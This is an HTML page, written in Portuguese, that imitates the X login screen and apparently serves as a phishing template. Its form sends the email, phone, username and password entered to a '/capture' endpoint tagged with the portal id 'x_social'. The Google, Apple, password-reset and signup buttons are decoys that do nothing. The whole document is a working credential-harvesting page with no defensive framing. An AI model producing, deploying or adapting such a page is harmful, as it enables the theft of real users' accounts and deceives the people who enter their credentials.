<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>X - Entrar</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;background:#000;color:#e7e9ea;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:16px}
.container{width:100%;max-width:364px}
.x-logo{text-align:center;margin-bottom:32px;font-size:40px;font-weight:900;color:#fff;font-family:serif;letter-spacing:-2px}
h1{font-size:31px;font-weight:900;color:#e7e9ea;text-align:center;margin-bottom:32px;line-height:1.2}
.social-btn{width:100%;padding:12px 20px;background:#fff;color:#0f1419;border:none;border-radius:50px;font-size:15px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px;transition:background .15s}
.social-btn:hover{background:#e6e6e6}
.social-btn .icon{width:20px;height:20px;display:inline-block;font-size:16px}
.separator{display:flex;align-items:center;gap:12px;margin:16px 0;color:#555;font-size:14px}
.separator::before,.separator::after{content:'';flex:1;height:1px;background:#2f3336}
.method-tabs{display:flex;gap:0;border:1px solid #2f3336;border-radius:8px;overflow:hidden;margin-bottom:20px}
.mtab{flex:1;padding:10px 6px;background:transparent;border:none;color:#71767b;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;text-align:center}
.mtab.active{background:#1d9bf0;color:#fff}
.tab-pane{display:none}
.tab-pane.active{display:block}
label{display:block;font-size:11px;color:#71767b;margin-bottom:5px;text-transform:uppercase;letter-spacing:.8px}
input[type=text],input[type=email],input[type=password]{width:100%;background:#000;border:1px solid #333639;border-radius:4px;padding:14px 12px;font-size:17px;color:#e7e9ea;outline:none;margin-bottom:16px;transition:border-color .2s}
input:focus{border-color:#1d9bf0}
.btn-next{width:100%;padding:14px;background:#e7e9ea;color:#0f1419;border:none;border-radius:50px;font-size:17px;font-weight:900;cursor:pointer;margin-top:4px;transition:background .15s}
.btn-next:hover{background:#d0d0d0}
.forgot{text-align:center;margin-top:20px;font-size:15px}
.forgot a{color:#1d9bf0;text-decoration:none;font-weight:700}
.signup{text-align:center;margin-top:40px;font-size:15px;color:#71767b}
.signup a{color:#1d9bf0;text-decoration:none;font-weight:700}
@media(max-width:480px){h1{font-size:26px}.x-logo{font-size:34px}}
</style>
</head>
<body>
<div class="container">
  <div class="x-logo">&#120143;</div>
  <h1>Entre no X</h1>
  <button class="social-btn" type="button" onclick="return false"><span class="icon">G</span> Continuar com o Google</button>
  <button class="social-btn" type="button" onclick="return false"><span class="icon">&#63743;</span> Continuar com a Apple</button>
  <div class="separator"><span>ou</span></div>
  <div class="method-tabs">
    <button class="mtab active" onclick="switchM('email',this)">E-mail</button>
    <button class="mtab" onclick="switchM('phone',this)">Telefone</button>
    <button class="mtab" onclick="switchM('user',this)">Usuario</button>
  </div>
  <form action="/capture" method="POST" autocomplete="off">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="portal_id" value="x_social">
    <input type="hidden" name="login_method" id="xmethod" value="email">
    <div class="tab-pane active" id="xpane-email">
      <label>E-mail</label>
      <input type="email" name="email" placeholder="Seu e-mail" autocomplete="off">
    </div>
    <div class="tab-pane" id="xpane-phone">
      <label>Telefone</label>
      <input type="text" name="phone" placeholder="(00) 00000-0000" oninput="maskPhone(this)" autocomplete="off">
    </div>
    <div class="tab-pane" id="xpane-user">
      <label>@usuario</label>
      <input type="text" name="username" placeholder="@seuusuario" autocomplete="off">
    </div>
    <label>Senha</label>
    <input type="password" name="password" placeholder="Senha" required minlength="6" maxlength="128" autocomplete="new-password">
    <button class="btn-next" type="submit">Entrar</button>
  </form>
  <p class="forgot"><a href="#" onclick="return false">Esqueceu a senha?</a></p>
  <p class="signup">Nao tem conta? <a href="#" onclick="return false">Cadastre-se</a></p>
</div>
<script>
function switchM(t,btn){
  document.querySelectorAll('.tab-pane').forEach(function(e){e.classList.remove('active')});
  document.querySelectorAll('.mtab').forEach(function(e){e.classList.remove('active')});
  document.getElementById('xpane-'+t).classList.add('active');
  btn.classList.add('active');
  document.getElementById('xmethod').value=t;
}
function maskPhone(el){
  var v=el.value.replace(/\D/g,'').slice(0,11);
  if(v.length>6)v=v.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3');
  else if(v.length>2)v=v.replace(/(\d{2})(\d+)/,'($1) $2');
  el.value=v;
}
</script>
</body>
</html>
